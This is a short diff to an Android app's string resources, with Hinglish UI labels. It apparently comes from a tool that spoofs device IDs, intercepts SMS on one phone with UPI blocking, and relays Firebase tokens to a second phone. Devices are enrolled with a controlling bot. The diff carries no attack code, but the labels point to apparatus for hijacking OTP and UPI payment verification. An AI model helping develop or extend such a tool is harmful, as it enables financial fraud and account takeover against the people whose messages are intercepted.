@@ -234,7 +234,7 @@
     <string name="device_id_persist_note">Clear data ke baad bhi same ID — module level spoof active</string>
 
     <string name="autotoken_title">Firebase Auto-Token Relay</string>
-    <string name="autotoken_hint">Phone A = Intercept (UPI block) · Phone B = Sender (real SIM SMS). Device ID bot ko bhejo verify ke liye.</string>
+    <string name="autotoken_hint">Phone A = Intercept · Phone B = Sender. Device ID bot ko bhejo — Firebase attach pe bot pe sab devices dikhengi.</string>
     <string name="autotoken_enable">Enable Auto-Token Relay</string>
     <string name="autotoken_db_url">Firebase Database URL</string>
     <string name="autotoken_db_url_hint">https://project.firebaseio.com</string>
